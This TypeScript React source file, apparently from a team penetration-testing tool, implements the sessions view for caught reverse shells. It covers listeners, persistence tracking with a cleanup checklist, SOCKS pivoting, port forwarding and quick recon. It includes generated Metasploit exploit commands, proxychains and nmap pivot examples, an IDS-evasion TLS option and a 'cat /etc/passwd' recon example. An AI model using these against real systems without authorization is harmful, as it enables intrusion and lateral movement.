import { useEffect, useState } from "react";
import { SessionInfo, ListenerInfo, getSessions, getListeners, startListener, stopListener,
  lootCred, getTranscript, upgradeSession, runEnum, downloadFromShell, uploadToShell,
  persistSession, getPersistence, removeAllPersistence, Persistence, patchSession,
  spawnSession, closeSession,
  QuickAction, getQuickActions, runQuickAction, runShellCmd,
  PortFwd, startPortFwd, stopPortFwd, listPortFwds,
  TunnelStatus, startTunnel, stopTunnel, tunnelStatus,
  TeardownInventory, getTeardown, clearTeardownUpload } from "../api";
import { ShellTerminal } from "./Terminal";
import { PayloadCatalog, StabilizeGuide, PostExploitRef, PivotGuide, ToolCatalog } from "./Payloads";
import { bytesToB64 } from "../util";
import type { ExploitIntent } from "../views/shared";

function relTime(epoch: number): string {
  const d = Math.floor((Date.now() / 1000) - epoch);
  if (d < 60) return "just now";
  if (d < 3600) return `${Math.floor(d / 60)}m ago`;
  if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
  return `${Math.floor(d / 86400)}d ago`;
}
function fmtBytes(n: number): string {
  if (n < 1024) return `${n}B`;
  if (n < 1048576) return `${(n / 1024).toFixed(0)}KB`;
  return `${(n / 1048576).toFixed(1)}MB`;
}

// The Sessions tab: open listeners, watch caught shells land (grouped by host), and drive
// them collaboratively. The whole team sees the same list on the one shared server.
export function Sessions({ tester, focus, exploitIntent, onExploitConsumed, onScanHost, onViewHost }: {
  tester: string; focus?: string | null;
  exploitIntent?: ExploitIntent | null;
  onExploitConsumed?: () => void;
  onScanHost?: (ip: string) => void;
  onViewHost?: (ip: string) => void;
}) {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [listeners, setListeners] = useState<ListenerInfo[]>([]);
  const [open, setOpen] = useState<string | null>(null);
  const [port, setPort] = useState("4444");
  const [tls, setTls] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  const [payloadsFor, setPayloadsFor] = useState<string | null>(null);
  const [persist, setPersist] = useState<Persistence[]>([]);

  // open a specific session when jumped here from the host drawer
  useEffect(() => { if (focus) setOpen(focus); }, [focus]);

  // Auto-select the first live session on tab entry: an unselected Sessions
  // tab renders an empty terminal panel even when sessions exist, which reads
  // as broken. Only runs when nothing is selected and at least one live shell
  // is available.
  useEffect(() => {
    if (open) return;
    const first = sessions.find((s) => s.status === "live");
    if (first) setOpen(first.id);
  }, [sessions, open]);

  // When an "exploit → shell" intent arrives from a KEV finding, auto-expand
  // the first listener's payload catalog so the tester lands on the payload
  // they'll paste on the target — instead of a bare Sessions tab.
  useEffect(() => {
    if (exploitIntent && listeners.length > 0 && !payloadsFor) {
      setPayloadsFor(listeners[0].id);
    }
  }, [exploitIntent, listeners]);

  async function refresh() {
    try {
      const [s, l, p] = await Promise.all([getSessions(), getListeners(), getPersistence()]);
      setSessions(s);
      setListeners(l);
      setPersist(p.filter((x) => !x.removed_at));
    } catch { /* transient */ }
  }
  async function sweepPersistence() {
    if (!window.confirm(`Remove ALL ${persist.length} tracked persistence artifact(s) across every host?`)) return;
    try {
      const r = await removeAllPersistence();
      if (r.failed.length) {
        alert(`Removed ${r.removed}. ⚠ ${r.failed.length} COULD NOT be removed (need MANUAL cleanup):\n\n` +
          r.failed.map((f) => `  ${f.host_ip}  ${f.path}  — ${f.reason}`).join("\n"));
      } else {
        alert(`✓ Removed all ${r.removed} persistence artifact(s). Nothing left behind.`);
      }
      refresh();
    } catch (e) { alert(String(e instanceof Error ? e.message : e)); }
  }
  useEffect(() => {
    refresh();
    // instant updates: the broker pushes session events (caught / status / upgrading) over
    // SSE, so a shell appears the moment it lands. A slow poll stays as a safety net.
    const es = new EventSource("/api/events");
    es.onmessage = (m) => {
      try { if (JSON.parse(m.data).type === "session") refresh(); } catch { /* ignore */ }
    };
    const id = window.setInterval(refresh, 6000);
    return () => { es.close(); window.clearInterval(id); };
  }, []);

  async function addListener() {
    setErr(null);
    try {
      await startListener(parseInt(port, 10) || 0, tls);
      refresh();
    } catch (e) {
      setErr(String(e instanceof Error ? e.message : e));
    }
  }

  const openSession = sessions.find((s) => s.id === open) || null;
  const [collapsed, setCollapsed] = useState<Set<string>>(new Set());
  // Session rail filters: chip axes + free-text search. Filters ONLY the
  // sessions list; listeners + terminal stay unaffected.
  const [sfilter, setSfilter] = useState<{status: string; pty: string; q: string}>(
    { status: "all", pty: "all", q: "" });
  const filteredSessions = sessions.filter(s => {
    if (sfilter.status !== "all" && s.status !== sfilter.status) return false;
    if (sfilter.pty === "pty" && !s.pty) return false;
    if (sfilter.pty === "raw" && s.pty) return false;
    if (sfilter.q) {
      const q = sfilter.q.toLowerCase();
      const hay = `${s.host_ip} ${s.label || ""} ${s.name || ""} ${s.id}`.toLowerCase();
      if (!hay.includes(q)) return false;
    }
    return true;
  });
  const anyFilter = sfilter.status !== "all" || sfilter.pty !== "all" || !!sfilter.q;
  const toggleGroup = (ip: string) => setCollapsed(s => {
    const n = new Set(s);
    n.has(ip) ? n.delete(ip) : n.add(ip);
    return n;
  });

  const hostGroups: [string, SessionInfo[]][] = (() => {
    const m = new Map<string, SessionInfo[]>();
    filteredSessions.forEach(s => {
      const arr = m.get(s.host_ip) || [];
      arr.push(s);
      m.set(s.host_ip, arr);
    });
    return [...m.entries()].sort((a, b) => {
      const aLive = a[1].some(s => s.status === "live") ? 0 : 1;
      const bLive = b[1].some(s => s.status === "live") ? 0 : 1;
      if (aLive !== bLive) return aLive - bLive;
      return a[0].localeCompare(b[0]);
    });
  })();

  // Teardown modal state — the aggregated view of everything recce deployed
  // that still needs cleanup. Loaded on open, refreshed after each clear.
  const [showTeardown, setShowTeardown] = useState(false);
  const [tinv, setTinv] = useState<TeardownInventory | null>(null);
  useEffect(() => {
    if (showTeardown) getTeardown().then(setTinv).catch(() => setTinv(null));
  }, [showTeardown]);
  async function clearUpload(id: string) {
    await clearTeardownUpload(id);
    getTeardown().then(setTinv);
  }

  // Spawn a new shell on `ip` by piggy-backing on any live PTY session on
  // that host (spawnSession only works from a PTY parent — the raw stager
  // can't self-fork reliably). Falls back with a helpful hint otherwise.
  async function spawnOnHost(ip: string) {
    const group = hostGroups.find(([h]) => h === ip)?.[1] || [];
    const parent = group.find(s => s.pty && s.status === "live");
    if (!parent) {
      setErr(`can't spawn — need a live PTY session on ${ip}. Upgrade an existing shell first (⤴ Upgrade).`);
      return;
    }
    try {
      const r = await spawnSession(parent.id);
      if (!r.ok) setErr(r.reason || "spawn failed");
      else refresh();
    } catch (e) { setErr(String(e instanceof Error ? e.message : e)); }
  }

  async function stopAllOnHost(ip: string) {
    const group = hostGroups.find(([h]) => h === ip)?.[1] || [];
    const live = group.filter(s => s.status !== "dead");
    if (live.length === 0) return;
    if (!window.confirm(`Stop ${live.length} session(s) on ${ip}? The transcript(s) stay on disk and remain downloadable.`)) return;
    try {
      await Promise.allSettled(live.map(s => closeSession(s.id)));
      if (open && live.some(s => s.id === open)) setOpen(null);
      refresh();
    } catch (e) { setErr(String(e instanceof Error ? e.message : e)); }
  }

  async function closeOne(id: string, e?: React.MouseEvent) {
    if (e) e.stopPropagation();
    try {
      await closeSession(id);
      if (open === id) setOpen(null);
      refresh();
    } catch (e2) { setErr(String(e2 instanceof Error ? e2.message : e2)); }
  }

  async function purgeStale() {
    const stale = sessions.filter(s => s.status === "stale" || s.status === "dead");
    if (stale.length === 0) return;
    if (!window.confirm(`Purge ${stale.length} stale / dead session(s)? Transcripts stay on disk.`)) return;
    try {
      await Promise.allSettled(stale.map(s => closeSession(s.id)));
      if (open && stale.some(s => s.id === open)) setOpen(null);
      refresh();
    } catch (e) { setErr(String(e instanceof Error ? e.message : e)); }
  }

  async function stopAllListeners() {
    if (listeners.length === 0) return;
    if (!window.confirm(`Stop all ${listeners.length} listener(s)? Live sessions stay connected; only the accept ports close.`)) return;
    try {
      const r = await fetch("/api/listeners/stop-all", {method: "POST"});
      if (!r.ok) throw new Error(await r.text());
      refresh();
    } catch (e) { setErr(String(e instanceof Error ? e.message : e)); }
  }

  const hasTerminal = !!openSession;

  return (
    <div className={"sessions-view" + (hasTerminal ? " has-terminal" : "")}>
      <div className="teardown-launch">
        <button className="toggle" onClick={() => setShowTeardown(true)}
                title="everything recce deployed that still needs cleanup at engagement end">
          🧹 Teardown checklist
        </button>
        <span className="muted small">verify cleanup before you close the engagement</span>
      </div>
      {showTeardown && (
        <div className="modal-backdrop" onClick={() => setShowTeardown(false)}>
          <div className="teardown-modal" onClick={e => e.stopPropagation()}>
            <div className="teardown-h">
              <h3>Teardown checklist</h3>
              <span className="muted small">
                {tinv ? `${tinv.total} item(s) recce deployed still tracked` : "loading…"}
              </span>
              <button className="linkish" onClick={() => setShowTeardown(false)} style={{marginLeft: "auto"}}>× close</button>
            </div>
            <div className="teardown-body">
              {tinv && tinv.total === 0 && (
                <div className="teardown-clean">
                  ✓ Nothing left behind — safe to close the engagement.
                </div>
              )}
              {tinv?.persistence?.length ? (
                <section>
                  <h4>Persistence artifacts on target ({tinv.persistence.length})</h4>
                  <p className="muted small">Use the Sessions "Remove all" button — recce runs the tracked remove_cmd via a live shell.</p>
                  <ul>{tinv.persistence.map((p: any) => (
                    <li key={p.id}><span className="mono">{p.host_ip}</span> · <code>{p.artifact_path}</code> · <span className="muted">{p.mechanism}</span></li>
                  ))}</ul>
                </section>
              ) : null}
              {tinv?.uploads?.length ? (
                <section>
                  <h4>Uploaded files on target ({tinv.uploads.length})</h4>
                  <p className="muted small">Delete each via a shell on that host (<code>rm -f {"<path>"}</code>), then check it off here.</p>
                  <ul>{tinv.uploads.map((u: any) => (
                    <li key={u.id}>
                      <span className="mono">{u.host_ip}</span> · <code>{u.remote_path}</code>
                      <span className="muted small"> · {u.bytes} B · by {u.uploaded_by}</span>
                      <button className="linkish" onClick={() => clearUpload(u.id)}>✓ cleared</button>
                    </li>
                  ))}</ul>
                </section>
              ) : null}
              {tinv?.listeners?.length ? (
                <section>
                  <h4>Active listeners on this host ({tinv.listeners.length})</h4>
                  <p className="muted small">Stop each via the Listeners panel — leaving one open past engagement leaks the callback port.</p>
                  <ul>{tinv.listeners.map((l: any) => (
                    <li key={l.id}><span className="mono">:{l.port}</span> · <span className="muted">{l.kind}</span></li>
                  ))}</ul>
                </section>
              ) : null}
              {tinv?.sessions?.length ? (
                <section>
                  <h4>Live shells ({tinv.sessions.length})</h4>
                  <p className="muted small">Close via ✕ or group "stop all" — transcript stays on disk.</p>
                  <ul>{tinv.sessions.map((s: any) => (
                    <li key={s.id}><span className="mono">{s.host_ip}</span> · {s.name} · {s.pty ? "PTY" : "raw"}</li>
                  ))}</ul>
                </section>
              ) : null}
              {tinv?.tunnels?.length ? (
                <section>
                  <h4>Active SOCKS tunnels ({tinv.tunnels.length})</h4>
                  <ul>{tinv.tunnels.map((t: any, i: number) => (
                    <li key={i}><span className="mono">{t.host_ip}</span> · SOCKS :{t.socks_port}</li>
                  ))}</ul>
                </section>
              ) : null}
              {tinv?.portfwds?.length ? (
                <section>
                  <h4>Port forwards ({tinv.portfwds.length})</h4>
                  <ul>{tinv.portfwds.map((f: any, i: number) => (
                    <li key={i}><span className="mono">:{f.lport}</span> → <span className="mono">{f.rhost}:{f.rport}</span></li>
                  ))}</ul>
                </section>
              ) : null}
            </div>
          </div>
        </div>
      )}
      {exploitIntent && (
        <div className="exploit-intent-banner">
          <div className="eib-row">
            <span className="eib-icon">🎯</span>
            <div className="eib-body">
              <div className="eib-title">
                Exploiting <span className="mono">{exploitIntent.cve || exploitIntent.title}</span>
                <span className="muted"> on </span>
                <span className="mono">{exploitIntent.ip}{exploitIntent.port ? `:${exploitIntent.port}` : ""}</span>
              </div>
              {exploitIntent.module ? (
                <div className="eib-msf">
                  <span className="muted small">msf resource:</span>
                  <code className="eib-mod">
                    use {exploitIntent.module}; set RHOSTS {exploitIntent.ip}
                    {exploitIntent.port ? `; set RPORT ${exploitIntent.port}` : ""}
                    {exploitIntent.payload ? `; set PAYLOAD ${exploitIntent.payload}` : ""}
                    ; set LHOST YOUR_IP; set LPORT {listeners[0]?.port || 4444}; check
                  </code>
                  <button className="linkish" onClick={() => {
                    navigator.clipboard?.writeText(
                      `use ${exploitIntent.module}\nset RHOSTS ${exploitIntent.ip}\n`
                      + (exploitIntent.port ? `set RPORT ${exploitIntent.port}\n` : "")
                      + (exploitIntent.payload ? `set PAYLOAD ${exploitIntent.payload}\n` : "")
                      + `set LPORT ${listeners[0]?.port || 4444}\ncheck\n`);
                  }}>copy .rc</button>
                </div>
              ) : (
                <div className="muted small">
                  No mapped msf module for this CVE — pick a payload below and run your own exploit
                  against <span className="mono">{exploitIntent.ip}</span>.
                </div>
              )}
              {exploitIntent.note && <div className="eib-note muted small">{exploitIntent.note}</div>}
              {listeners.length === 0 && (
                <div className="eib-hint warn-msg small">
                  ⚠ no listener open — start one on the port you'll use as LPORT before firing the exploit.
                </div>
              )}
            </div>
            <button className="linkish eib-dismiss" onClick={() => onExploitConsumed?.()}
                    title="dismiss this exploit intent">✕</button>
          </div>
        </div>
      )}
      {persist.length > 0 && (
        <div className="persist-banner">
          <span>⚠ <b>{persist.length}</b> active persistence artifact(s) installed across{" "}
            {new Set(persist.map((p) => p.host_ip)).size} host(s) — <b>remove before you leave the engagement</b></span>
          <button className="run danger-btn" onClick={sweepPersistence}>Remove all</button>
        </div>
      )}
      <div className="sessions-cols">
      <div className="sessions-rail">
      <section className="panel">
        <div className="panel-h">
          <h3>Listeners</h3>
          <span className="muted">catch a reverse shell on the shared server</span>
          {listeners.length > 1 && (
            <button className="linkish" onClick={stopAllListeners} title="close every accept port at once (live sessions keep their connections)"
                    style={{marginLeft: "auto"}}>stop all</button>
          )}
        </div>
        <div className="listener-row">
          <input className="scan-in" value={port} onChange={(e) => setPort(e.target.value)}
                 placeholder="port" style={{ maxWidth: 100 }} />
          <label className="tls-tog" title="TLS-encrypted channel (defeats on-wire sniffing / IDS)">
            <input type="checkbox" checked={tls} onChange={(e) => setTls(e.target.checked)} /> TLS
          </label>
          <button className="run" onClick={addListener}>▶ Open listener</button>
        </div>
        {err && <div className="ranmsg warn-msg">{err}</div>}
        <div className="listener-list">
          {listeners.length === 0 && <div className="muted">no listeners yet</div>}
          {listeners.map((l) => (
            <div key={l.id} className="listener-block">
              <div className="listener-item">
                <span className="mono">:{l.port}</span>
                <span className={"badge" + (l.kind === "tls" ? " pty" : "")}>{l.kind === "tls" ? "🔒 tls" : l.kind}</span>
                <button className="linkish" onClick={() => setPayloadsFor(payloadsFor === l.id ? null : l.id)}>
                  {payloadsFor === l.id ? "hide payloads" : "payloads ▾"}
                </button>
                <button className="linkish" onClick={() => { stopListener(l.id).then(refresh); }}>stop</button>
              </div>
              {payloadsFor === l.id && <PayloadCatalog port={l.port} tls={l.kind === "tls"} />}
            </div>
          ))}
        </div>
      </section>

      <section className="panel">
        <div className="panel-h">
          <h3>Sessions</h3>
          <span className="muted">
            {sessions.filter((s) => s.status === "live").length} live · {sessions.length} total
            {hostGroups.length > 0 && ` · ${hostGroups.length} host${hostGroups.length > 1 ? "s" : ""}`}
          </span>
          {sessions.some((s) => s.status === "stale" || s.status === "dead") && (
            <button className="linkish" onClick={purgeStale} title="drop stale + dead session rows (transcripts stay on disk)"
                    style={{marginLeft: "auto"}}>purge stale</button>
          )}
        </div>
        {sessions.length === 0 && (
          <div className="empty">
            No shells yet. Open a listener above, run its payload on a target, and the caught
            shell lands here — live for the whole team, tied to its host.
          </div>
        )}
        {sessions.length > 0 && (
          <div className="sess-filter-bar">
            {(["all", "live", "stale", "dead"] as const).map(s => (
              <button key={s}
                      className={"sess-fchip" + (sfilter.status === s ? " sel" : "")}
                      onClick={() => setSfilter({ ...sfilter, status: s })}>
                {s === "all" ? "All" : s[0].toUpperCase() + s.slice(1)}
              </button>
            ))}
            <span className="sess-fchip-sep" />
            {(["all", "pty", "raw"] as const).map(p => (
              <button key={p}
                      className={"sess-fchip" + (sfilter.pty === p ? " sel" : "")}
                      onClick={() => setSfilter({ ...sfilter, pty: p })}>
                {p === "all" ? "Any" : p === "pty" ? "PTY" : "Raw"}
              </button>
            ))}
            <input className="search sess-fsearch" placeholder="host, name, label…"
                   value={sfilter.q} onChange={e => setSfilter({ ...sfilter, q: e.target.value })} />
            {anyFilter && (
              <button className="linkish"
                      onClick={() => setSfilter({ status: "all", pty: "all", q: "" })}>clear</button>
            )}
            <span className="muted small sess-fcount">
              {filteredSessions.length}/{sessions.length}
            </span>
          </div>
        )}
        {sessions.length > 0 && filteredSessions.length === 0 && (
          <div className="empty">no session matches this filter</div>
        )}
        <div className="session-list">
          {hostGroups.map(([ip, group]) => {
            const liveCount = group.filter(s => s.status === "live").length;
            const isCollapsed = collapsed.has(ip);
            return (
              <div key={ip} className="sess-group">
                <div className="sess-group-h" onClick={() => toggleGroup(ip)}>
                  <span className={`sess-group-caret${isCollapsed ? " closed" : ""}`}>&#9662;</span>
                  {liveCount > 0 && <span className="sess-dot live" />}
                  {liveCount === 0 && <span className="sess-dot stale" />}
                  <span className="mono">{ip}</span>
                  <span className="muted">
                    {liveCount > 0 ? `${liveCount} live` : "dead"}{group.length > 1 ? ` · ${group.length} total` : ""}
                  </span>
                  {(() => {
                    const hasPtyLive = group.some(s => s.pty && s.status === "live");
                    const hasLive = group.some(s => s.status !== "dead");
                    return (
                      <>
                        <button className="linkish sess-group-action" onClick={(e) => { e.stopPropagation(); spawnOnHost(ip); }}
                                disabled={!hasPtyLive}
                                title={hasPtyLive
                                  ? "spawn another session on this host from a live PTY"
                                  : "need a live PTY on this host to spawn — upgrade a raw shell first"}>
                          + shell
                        </button>
                        {onViewHost && (
                          <button className="linkish sess-group-action" onClick={(e) => { e.stopPropagation(); onViewHost(ip); }}
                                  title="open host detail drawer">detail</button>
                        )}
                        {onScanHost && (
                          <button className="linkish sess-group-action" onClick={(e) => { e.stopPropagation(); onScanHost(ip); }}
                                  title="jump to Scan tab with this host pre-filled">scan</button>
                        )}
                        <button className="linkish sess-group-action danger" onClick={(e) => { e.stopPropagation(); stopAllOnHost(ip); }}
                                disabled={!hasLive}
                                title="close every session on this host (transcript kept on disk)">
                          stop all
                        </button>
                      </>
                    );
                  })()}
                </div>
                {!isCollapsed && (
                  <div className="sess-group-items">
                    {group.map((s) => (
                      <div key={s.id} className={"session-item-wrap" + (s.id === open ? " sel" : "")}>
                        <button className={"session-item" + (s.id === open ? " sel" : "")}
                                onClick={() => setOpen(s.id === open ? null : s.id)}>
                          <span className={"sess-dot " + (s.status === "live" ? "live" : "stale")} />
                          <span className="sess-name" title={`${s.name || ""}  •  id ${s.id}`}>
                            {s.name || s.id.slice(0, 8)}
                          </span>
                          <span className="badge">{s.status}</span>
                          {s.pty && <span className="badge pty" title="robust PTY (auto-reconnect stager)">PTY</span>}
                          {typeof (s as any).socks_port === "number" && (
                            <span className="badge sess-pivot"
                                  title={`SOCKS5 proxy listening on :${(s as any).socks_port} — proxychains through this shell`}>
                              SOCKS :{(s as any).socks_port}
                            </span>
                          )}
                          {(s as any).portfwd_count > 0 && (
                            <span className="badge sess-pivot"
                                  title={((s as any).portfwd_preview || []).join(" · ") || "port forwards active"}>
                              {(s as any).portfwd_count} fwd
                            </span>
                          )}
                          {(s as any).oob_active && (
                            <span className="badge sess-pivot"
                                  title="OOB control channel bound — quickrun / file transfer / enum flow over a dedicated TCP frame protocol instead of the PTY, so the terminal stays clean">
                              OOB
                            </span>
                          )}
                          {s.label && <span className="sess-label" title={s.label}>{s.label}</span>}
                          {s.driver && <span className="muted">▸ {s.driver}</span>}
                          {s.attached.length > 0 && <span className="muted">👁 {s.attached.length}</span>}
                          <span className="muted sess-meta">{relTime(s.created)}{s.bytes > 0 ? ` · ${fmtBytes(s.bytes)}` : ""}</span>
                        </button>
                        <button className="sess-close" onClick={(e) => closeOne(s.id, e)}
                                title="close this session (transcript kept on disk)">×</button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </section>

      </div>{/* .sessions-rail */}

      <div className="sessions-terminal-pane">
        {openSession ? (
          <section className="panel">
            <div className="panel-h">
              <h3>Terminal — <span className="mono">{openSession.host_ip}</span>
                <span className="muted" style={{fontSize: "0.8em", marginLeft: 8}}>
                  {openSession.name || openSession.id.slice(0, 8)}
                </span>
              </h3>
              <div className="sess-host-actions">
                <input className="sess-label-input" placeholder="label this session…"
                       defaultValue={openSession.label}
                       onBlur={(e) => {
                         const v = e.target.value.trim();
                         if (v !== openSession.label) patchSession(openSession.id, { label: v }).then(refresh);
                       }}
                       onKeyDown={(e) => { if (e.key === "Enter") (e.target as HTMLInputElement).blur(); }}
                />
                {onViewHost && (
                  <button className="linkish" onClick={() => onViewHost(openSession.host_ip)}
                          title="open host detail drawer">host detail</button>
                )}
                {onScanHost && (
                  <button className="linkish" onClick={() => onScanHost(openSession.host_ip)}
                          title="jump to Scan tab with this host pre-filled">scan host</button>
                )}
                <button className="linkish" onClick={() => setOpen(null)}>close</button>
              </div>
            </div>
            <ShellTerminal key={openSession.id} session={openSession} tester={tester} />
            <SessionHostSummary hostIp={openSession.host_ip} onViewHost={onViewHost} />
            <SessionTools session={openSession} />
          </section>
        ) : (
          <section className="panel sess-empty-panel">
            <div className="sess-empty-hero">
              <div className="sess-empty-icon">▮</div>
              <h3>No session selected</h3>
              {sessions.length === 0 ? (
                <p className="muted">
                  Open a listener on the left, run its payload on a target, and the caught
                  shell will appear here — live for the whole team.
                </p>
              ) : (
                <p className="muted">
                  Pick a session from the rail to attach — the terminal lands right here.
                </p>
              )}
            </div>
          </section>
        )}
      </div>
      </div>{/* .sessions-cols */}
    </div>
  );
}

// Reverse SOCKS proxy through the shell — one-button tunnel to the target's internal network.
function TunnelPanel({ session }: { session: SessionInfo }) {
  const [status, setStatus] = useState<TunnelStatus>({ active: false });
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [socksPort, setSocksPort] = useState("1080");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (session.status === "live") tunnelStatus(session.id).then(setStatus).catch(() => {});
  }, [session.id, session.status]);

  async function doStart() {
    setBusy(true); setMsg(null);
    try {
      const r = await startTunnel(session.id, parseInt(socksPort, 10) || 1080);
      if (r.ok) {
        setStatus({ active: true, socks_port: r.socks_port, socks_addr: r.socks_addr, agent_pid: r.agent_pid });
        setMsg(null);
      } else {
        setMsg(r.reason || "failed to start tunnel");
      }
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }

  async function doStop() {
    setBusy(true); setMsg(null);
    try {
      await stopTunnel(session.id);
      setStatus({ active: false });
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }

  function copyProxychains() {
    const conf = `socks5 127.0.0.1 ${status.socks_port || 1080}`;
    navigator.clipboard?.writeText(conf);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  }

  return (
    <div className="tunnel-section">
      {!status.active ? (
        <div className="tunnel-start">
          <div className="tunnel-start-row">
            <button className="run tunnel-btn" onClick={doStart}
                    disabled={busy || session.status !== "live"}>
              {busy ? "Deploying agent…" : "Start SOCKS Proxy"}
            </button>
            <input className="scan-in" placeholder="SOCKS port" value={socksPort}
                   onChange={e => setSocksPort(e.target.value)} style={{ maxWidth: 80 }} />
            <span className="muted small">reverse tunnel through this shell — route your tools through the target's network</span>
          </div>
        </div>
      ) : (
        <div className="tunnel-active">
          <div className="tunnel-status-row">
            <span className="sess-dot live" />
            <span className="tunnel-label">SOCKS5 proxy active</span>
            <code className="tunnel-addr">127.0.0.1:{status.socks_port}</code>
            <button className="toggle" onClick={doStop} disabled={busy}>Stop</button>
          </div>
          <div className="tunnel-usage">
            <div className="tunnel-usage-row">
              <span className="muted">proxychains:</span>
              <code>proxychains4 nmap -sT -Pn {session.host_ip}</code>
            </div>
            <div className="tunnel-usage-row">
              <span className="muted">proxychains.conf:</span>
              <code>socks5 127.0.0.1 {status.socks_port}</code>
              <button className="copy" onClick={copyProxychains}>{copied ? "✓" : "copy"}</button>
            </div>
            <div className="tunnel-usage-row">
              <span className="muted">browser/Burp:</span>
              <code>SOCKS5 127.0.0.1:{status.socks_port}</code>
            </div>
            <div className="tunnel-usage-row">
              <span className="muted">recce:</span>
              <code>recce scan --proxy socks5h://127.0.0.1:{status.socks_port}</code>
            </div>
          </div>
        </div>
      )}
      {msg && <div className="ranmsg warn-msg">{msg}</div>}
    </div>
  );
}

// Port forward through the shell — socat or Python relay on the target.
const COMMON_PORTS: [number, string][] = [
  [3306, "MySQL"], [5432, "PostgreSQL"], [1433, "MSSQL"], [27017, "MongoDB"],
  [6379, "Redis"], [8080, "HTTP alt"], [8443, "HTTPS alt"], [3389, "RDP"],
  [5900, "VNC"], [445, "SMB"],
];

function PortForwardPanel({ session }: { session: SessionInfo }) {
  const [fwds, setFwds] = useState<PortFwd[]>([]);
  const [rhost, setRhost] = useState("127.0.0.1");
  const [rport, setRport] = useState("");
  const [lport, setLport] = useState("");
  const [busy, setBusy] = useState(false);
  const [fwdMsg, setFwdMsg] = useState<string | null>(null);
  const [open, setOpen] = useState(false);

  useEffect(() => {
    if (session.status === "live") listPortFwds(session.id).then(setFwds).catch(() => {});
  }, [session.id, session.status]);

  async function start() {
    const rp = parseInt(rport, 10);
    const lp = parseInt(lport || rport, 10);
    if (!rp || !lp) return;
    setBusy(true); setFwdMsg(null);
    try {
      const r = await startPortFwd(session.id, lp, rhost, rp);
      if (r.ok) {
        setFwdMsg(`forwarding ${session.host_ip}:${lp} → ${rhost}:${rp} (${r.method})`);
        setRport(""); setLport("");
        listPortFwds(session.id).then(setFwds).catch(() => {});
      } else {
        setFwdMsg(r.reason || "failed to start forward");
      }
    } catch (e) { setFwdMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }

  async function stop(id: string) {
    try {
      await stopPortFwd(session.id, id);
      setFwds(f => f.filter(x => x.id !== id));
    } catch (e) { setFwdMsg(String(e instanceof Error ? e.message : e)); }
  }

  function usePreset(port: number) {
    setRport(String(port));
    setLport(String(port));
    setOpen(true);
  }

  return (
    <div className="portfwd-section">
      <div className="portfwd-header" onClick={() => setOpen(!open)}>
        <span className={`sess-group-caret${open ? "" : " closed"}`}>&#9662;</span>
        <span>Port Forwarding</span>
        {fwds.length > 0 && <span className="badge">{fwds.length} active</span>}
      </div>
      {open && (
        <div className="portfwd-body">
          <div className="portfwd-presets">
            {COMMON_PORTS.map(([p, label]) => (
              <button key={p} className="portfwd-preset" onClick={() => usePreset(p)}
                      title={`Forward ${label} (port ${p})`}>
                {label} <span className="muted">:{p}</span>
              </button>
            ))}
          </div>
          <div className="portfwd-form">
            <input className="scan-in" placeholder="remote host" value={rhost}
                   onChange={e => setRhost(e.target.value)} style={{ maxWidth: 140 }} />
            <input className="scan-in" placeholder="remote port" value={rport}
                   onChange={e => setRport(e.target.value)} style={{ maxWidth: 90 }} />
            <input className="scan-in" placeholder="listen port (same)" value={lport}
                   onChange={e => setLport(e.target.value)} style={{ maxWidth: 90 }} />
            <button className="run" onClick={start}
                    disabled={busy || !rport || session.status !== "live"}>
              {busy ? "Starting…" : "▶ Forward"}
            </button>
          </div>
          <div className="muted small" style={{ marginTop: 4 }}>
            Makes <code>{rhost}:{rport || "?"}</code> reachable at <code>{session.host_ip}:{lport || rport || "?"}</code> via the shell
          </div>
          {fwdMsg && <div className="ranmsg">{fwdMsg}</div>}
          {fwds.length > 0 && (
            <div className="portfwd-list">
              {fwds.map(f => (
                <div key={f.id} className="portfwd-item">
                  <span className="sess-dot live" />
                  <span className="mono">{session.host_ip}:{f.lport}</span>
                  <span className="muted">→</span>
                  <span className="mono">{f.rhost}:{f.rport}</span>
                  <span className="badge">{f.method}</span>
                  <button className="linkish" onClick={() => stop(f.id)}>stop</button>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// Quick-recon actions panel: catalog buttons (whoami/id/uname/...) that fire a
// non-attach `run_and_capture` and render the result inline. Plus an arbitrary-cmd
// text input for one-shot runs without stealing the terminal wheel.
function QuickActions({ session }: { session: SessionInfo }) {
  const [catalog, setCatalog] = useState<QuickAction[]>([]);
  const [busy, setBusy] = useState<string | null>(null);
  const [out, setOut] = useState<{ cmd: string; output: string } | null>(null);
  const [customCmd, setCustomCmd] = useState("");
  useEffect(() => { getQuickActions().then(setCatalog).catch(() => {}); }, []);
  async function fire(key: string) {
    setBusy(key); setOut(null);
    try { const r = await runQuickAction(session.id, key); setOut(r); }
    catch (e) { setOut({ cmd: key, output: String(e instanceof Error ? e.message : e) }); }
    finally { setBusy(null); }
  }
  async function runCustom() {
    const cmd = customCmd.trim();
    if (!cmd) return;
    setBusy("_custom"); setOut(null);
    try { const r = await runShellCmd(session.id, cmd); setOut({ cmd, output: r.output }); }
    catch (e) { setOut({ cmd, output: String(e instanceof Error ? e.message : e) }); }
    finally { setBusy(null); }
  }
  const disabled = session.status !== "live";
  return (
    <div className="st-section">
      <div className="st-section-label">Quick recon (no attach)</div>
      <div className="qa-bar">
        {catalog.map(a => (
          <button key={a.key} className={"qa-btn" + (busy === a.key ? " busy" : "")}
                  disabled={disabled || !!busy} onClick={() => fire(a.key)}
                  title={a.cmd}>
            {busy === a.key ? "…" : a.label}
          </button>
        ))}
      </div>
      <div className="qa-custom">
        <input className="scan-in" placeholder="run one-shot: e.g. cat /etc/passwd | head"
               value={customCmd} disabled={disabled || !!busy}
               onChange={e => setCustomCmd(e.target.value)}
               onKeyDown={e => { if (e.key === "Enter") runCustom(); }} />
        <button className="toggle" onClick={runCustom} disabled={disabled || !!busy || !customCmd.trim()}>
          {busy === "_custom" ? "…" : "▶ Run"}
        </button>
      </div>
      {out && (
        <div className="qa-out">
          <div className="qa-out-h"><code>{out.cmd}</code>
